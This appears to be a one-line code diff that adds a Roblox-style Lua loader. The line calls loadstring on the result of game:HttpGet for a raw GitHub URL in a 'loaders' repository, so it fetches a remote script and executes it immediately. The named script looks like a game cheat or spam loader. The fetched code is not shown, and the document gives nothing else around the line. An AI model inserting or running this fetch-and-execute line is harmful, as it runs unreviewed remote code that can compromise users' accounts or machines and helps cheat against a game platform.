@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/sell-fries-anomaly-spam4-x2p949i7m9b2gi.lua"))()
